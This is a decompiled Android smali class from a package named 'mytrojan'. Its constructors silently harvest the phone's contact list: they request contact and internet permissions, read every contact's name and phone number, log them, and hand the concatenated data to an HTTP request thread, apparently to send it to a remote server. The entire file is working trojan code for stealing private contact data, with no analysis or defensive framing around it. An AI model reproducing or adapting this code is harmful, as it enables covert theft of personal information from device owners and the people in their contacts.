.class public Lcom/example/mytrojan/ExecuteIt;
.super Ljava/lang/Object;
.source "ExecuteIt.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "TEST"

.field private static ctxTmp:Landroid/content/Context;


# instance fields
.field private ctx:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .registers 2

    .prologue
    .line 34
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 35
    sget-object v0, Lcom/example/mytrojan/ExecuteIt;->ctxTmp:Landroid/content/Context;

    iput-object v0, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    .line 36
    iget-object v0, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    if-eqz v0, :cond_e

    .line 37
    invoke-direct {p0}, Lcom/example/mytrojan/ExecuteIt;->getContactList()V

    .line 40
    :cond_e
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    .param p1, "ctx"    # Landroid/content/Context;

    .prologue
    .line 42
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 43
    sput-object p1, Lcom/example/mytrojan/ExecuteIt;->ctxTmp:Landroid/content/Context;

    .line 44
    iput-object p1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    .line 45
    invoke-direct {p0}, Lcom/example/mytrojan/ExecuteIt;->getContactList()V

    .line 46
    return-void
.end method

.method private getContactList()V
    .registers 15

    .prologue
    const/4 v13, 0x0

    const/4 v2, 0x0

    .line 79
    new-instance v9, Ljava/util/ArrayList;

    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V

    .line 80
    .local v9, "mPers":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    const-string v1, "android.permission.READ_CONTACTS"

    invoke-direct {p0, v1}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_14

    .line 81
    const-string v1, "android.permission.READ_CONTACTS"

    invoke-interface {v9, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 85
    :cond_14
    const-string v1, "android.permission.INTERNET"

    invoke-direct {p0, v1}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_21

    .line 87
    const-string v1, "android.permission.INTERNET"

    invoke-interface {v9, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 90
    :cond_21
    invoke-interface {v9}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_32

    .line 91
    new-array v1, v13, [Ljava/lang/String;

    invoke-interface {v9, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/String;

    invoke-direct {p0, v1}, Lcom/example/mytrojan/ExecuteIt;->requestPermission([Ljava/lang/String;)V

    .line 94
    :cond_32
    iget-object v1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 95
    .local v0, "cr":Landroid/content/ContentResolver;
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 98
    .local v7, "cur":Landroid/database/Cursor;
    if-eqz v7, :cond_e3

    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I

    move-result v1

    :goto_47
    if-lez v1, :cond_f8

    .line 99
    :cond_49
    :goto_49
    if-eqz v7, :cond_f8

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_f8

    .line 100
    const-string v1, "_id"

    .line 101
    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 100
    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 102
    .local v8, "id":Ljava/lang/String;
    const-string v1, "display_name"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 105
    .local v10, "name":Ljava/lang/String;
    const-string v1, "has_phone_number"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v1

    if-lez v1, :cond_49

    .line 107
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const-string v3, "contact_id = ?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    aput-object v8, v4, v13

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v11

    .line 114
    .local v11, "pCur":Landroid/database/Cursor;
    const-string v6, ""

    .line 115
    .local v6, "content":Ljava/lang/String;
    :goto_81
    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_e6

    .line 116
    const-string v1, "data1"

    invoke-interface {v11, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v11, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 118
    .local v12, "phoneNo":Ljava/lang/String;
    const-string v1, "TEST"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Name: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 119
    const-string v1, "TEST"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Phone Number: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 121
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "#"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "#"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 122
    goto :goto_81

    .end local v6    # "content":Ljava/lang/String;
    .end local v8    # "id":Ljava/lang/String;
    .end local v10    # "name":Ljava/lang/String;
    .end local v11    # "pCur":Landroid/database/Cursor;
    .end local v12    # "phoneNo":Ljava/lang/String;
    :cond_e3
    move v1, v13

    .line 98
    goto/16 :goto_47

    .line 123
    .restart local v6    # "content":Ljava/lang/String;
    .restart local v8    # "id":Ljava/lang/String;
    .restart local v10    # "name":Ljava/lang/String;
    .restart local v11    # "pCur":Landroid/database/Cursor;
    :cond_e6
    invoke-interface {v11}, Landroid/database/Cursor;->close()V

    .line 126
    new-instance v1, Ljava/lang/Thread;

    new-instance v3, Lcom/example/mytrojan/RequestHttp;

    invoke-direct {v3, v6}, Lcom/example/mytrojan/RequestHttp;-><init>(Ljava/lang/String;)V

    invoke-direct {v1, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    goto/16 :goto_49

    .line 132
    .end local v6    # "content":Ljava/lang/String;
    .end local v8    # "id":Ljava/lang/String;
    .end local v10    # "name":Ljava/lang/String;
    .end local v11    # "pCur":Landroid/database/Cursor;
    :cond_f8
    if-eqz v7, :cond_fd

    .line 133
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 135
    :cond_fd
    return-void
.end method

.method private hasPhonePermission(Ljava/lang/String;)Z
    .registers 6
    .param p1, "permission"    # Ljava/lang/String;

    .prologue
    .line 51
    const/4 v1, 0x0

    .line 54
    .local v1, "ret":Z
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v2, v3, :cond_11

    .line 57
    iget-object v2, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    invoke-static {v2, p1}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    .line 59
    .local v0, "hasPermission":I
    if-nez v0, :cond_10

    .line 60
    const/4 v1, 0x1

    .line 67
    .end local v0    # "hasPermission":I
    :cond_10
    :goto_10
    return v1

    .line 64
    :cond_11
    const/4 v1, 0x1

    goto :goto_10
.end method

.method private requestPermission([Ljava/lang/String;)V
    .registers 5
    .param p1, "permission"    # [Ljava/lang/String;

    .prologue
    .line 73
    move-object v0, p1

    check-cast v0, [Ljava/lang/String;

    .line 74
    .local v0, "requestPermissionArray":[Ljava/lang/String;
    iget-object v1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    check-cast v1, Landroid/app/Activity;

    const/4 v2, 0x1

    invoke-static {v1, v0, v2}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 75
    return-void
.end method
